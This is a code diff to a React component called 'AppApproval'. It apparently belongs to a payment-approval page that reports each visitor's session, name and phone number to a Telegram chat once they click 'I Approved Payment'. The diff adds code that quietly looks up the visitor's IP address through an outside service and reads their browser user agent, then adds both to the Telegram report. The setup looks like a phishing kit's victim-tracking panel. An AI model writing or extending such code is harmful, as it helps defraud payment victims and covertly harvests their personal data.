@@ -81,13 +81,31 @@ const AppApproval = ({
     return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
+  const getClientIp = async (): Promise<string | null> => {
+    try {
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      return data.ip;
+    } catch {
+      return null;
+    }
+  };
+
+  const getUserAgent = (): string => {
+    return navigator.userAgent || "Unknown";
+  };
+
   const sendApprovalToTelegram = async () => {
     try {
+      const clientIp = await getClientIp();
+      const userAgent = getUserAgent();
       const message = `📱 <b>Client Claims Payment Approved</b>
 
 📋 <b>Session:</b> #${sessionCode}
 👤 <b>Client:</b> ${clientName || "Unknown"}
 📱 <b>Phone:</b> ${phoneNumber || "N/A"}
+🌐 <b>IP:</b> <code>${clientIp || "Unknown"}</code>
+💻 <b>Device:</b> <code>${userAgent}</code>
 
 ✅ <b>Status:</b> Client clicked "I Approved Payment"
 ⏱ <b>Wait Time:</b> ${formatTime(elapsedSeconds)}
